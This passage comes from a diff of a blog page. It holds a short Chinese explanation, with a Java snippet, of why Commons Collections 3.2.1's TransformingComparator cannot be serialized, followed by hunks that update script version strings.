 <p><strong>任何类都可以被实例化（<code>new</code>），但只有实现了 <code>Serializable</code> 接口的类才能被序列化成字节流。</strong> 3.2.1 的 <code>TransformingComparator</code> 没有这个接口，序列化时直接抛异常：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 没有 Serializable，序列化时报错</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(...);</span><br><span class="line">oos.writeObject(comparator);  <span class="comment">// 抛 NotSerializableException</span></span><br></pre></td></tr></table></figure>
 
@@ -809,7 +809,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=mp2fxa3d" defer></script>
+<script src="/js/main.js?v=mp5bt8la" defer></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -1073,7 +1073,7 @@
 <script src="/js/plugins/hotkeys.js"></script>
 
 <!-- Achievements / Card System -->
-<script src="/js/plugins/achievements.js?v=mp2fxa3d"></script>
+<script src="/js/plugins/achievements.js?v=mp5bt8la"></script>
 
 <!-- Special Days - 节日彩蛋系统 -->
 <script src="/js/plugins/special-days.js"></script>
